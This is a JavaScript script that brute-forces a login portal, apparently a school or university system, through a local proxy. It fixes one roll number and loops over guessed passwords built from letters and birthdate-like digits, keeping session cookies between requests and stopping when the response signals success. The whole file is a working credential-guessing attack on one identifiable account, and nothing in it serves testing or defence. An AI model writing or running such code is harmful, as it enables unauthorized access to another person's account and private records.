
const sessionStart = async () => {
    try {
        const response = await fetch("http://localhost:5000/proxy");
        // console.log('Session established...');
        const cookie1 = response.headers.get('set-cookie')
        return cookie1

    } catch (error) {
        console.error("Error establishing session:", error);
    }
    
}

const login = async (roll, pass, cookie1) => {
    try {
      

        const response = await fetch("http://localhost:5000/action", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Cookie" : cookie1
            },
            body: JSON.stringify({roll,pass})
        });

        const cookie2 = response.headers.get('set-cookie')

        const responsee = await fetch("http://localhost:5000/actionparents", {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Cookie" : cookie2
            },
            body: JSON.stringify({roll,pass})
        });
        
        
        const data = await responsee.text();
       
        // console.log(data)
        if (data.includes("frameset")) return true
        return false;
    } catch (error) {
        console.log("Login Error:", error);
    }
}

const trylogin = async (roll, pass) => {
    const cookiee = await sessionStart(); 
    const response = await login(roll, pass, cookiee);
    return response;
}
let found = false

const stri = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
let roll = `102303564`
const stri2 = "PR"
// for(let k=0;k<1;k++){
    // let m = 0
    // if(k==0) m=17
    for(let i=15;i<26;i++){
        for(let dd=0;dd<26;dd++){
            for(let mm=3;mm<=6;mm++){
                // let formattedDD = String(dd).padStart(2,'0')
                // let formattedMM = String(mm).padStart(2,'0')
                // let pass = `R${stri[i]}${formattedDD}${formattedMM}2006`
                let pass = `${stri[i]}${stri[dd]}0902200${mm}`
                console.log(pass);
                const res = await trylogin(roll, pass)
                if(res){
                    console.log('...login successfull')
                    found = true
                    break
                }
            }
            if(found) break
        }
        if(found) break
    }
//     if(found) break
// }



